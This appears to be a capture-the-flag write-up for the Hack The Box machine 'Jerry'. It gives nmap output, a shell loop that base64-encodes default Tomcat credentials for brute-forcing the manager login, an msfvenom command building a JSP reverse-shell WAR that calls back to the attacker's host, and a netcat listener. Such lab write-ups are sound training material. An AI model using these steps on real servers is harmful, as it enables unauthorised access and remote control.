# Hack the box - Jerry

1. run nmap
2. apache tomcat's management page available at <IP>:8080
3. looked at the GET request when trying to log in to the management panel through burp suite
4. the data from the input fields are combined with ':' delimiter and hashed with base64
5. either test default credentials manually or run a brute force attack with burp suite
6. create reverse shell with msfvenom
7. upload reverse shell war file to the server through the management site
8. run netcat listener
9. run the reverse shell on the server.

Nmap results
```
Nmap scan report for 10.10.10.95
Host is up (0.058s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

```

Creating a list of default credentials hashed with base64. tomcat.txt contains line separated "username:password".
```bash
for cred in $(cat tomcat.txt); do echo -n $cred | base64 >> base64_creds.txt; done

cat base64_creds.txt

YWRtaW46cGFzc3dvcmQ=
YWRtaW46
YWRtaW46UGFzc3dvcmQx
YWRtaW46cGFzc3dvcmQx
YWRtaW46YWRtaW4=
YWRtaW46dG9tY2F0
Ym90aDp0b21jYXQ=
bWFuYWdlcjptYW5hZ2Vy
cm9sZTE6cm9sZTE=
cm9sZTE6dG9tY2F0
cm9sZTpjaGFuZ2V0aGlz
cm9vdDpQYXNzd29yZDE=
cm9vdDpjaGFuZ2V0aGlz
cm9vdDpwYXNzd29yZA==
cm9vdDpwYXNzd29yZDE=
cm9vdDpyMDB0
cm9vdDpyb290
cm9vdDp0b29y
dG9tY2F0OnRvbWNhdA==
dG9tY2F0OnMzY3JldA==
dG9tY2F0OnBhc3N3b3JkMQ==
dG9tY2F0OnBhc3N3b3Jk
dG9tY2F0Og==
dG9tY2F0OmFkbWlu
dG9tY2F0OmNoYW5nZXRoaXM=

```

Creating reverse shell war file to upload to the server
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war

```

Running netcat listener
```bash
nc -nlvp 4444
```
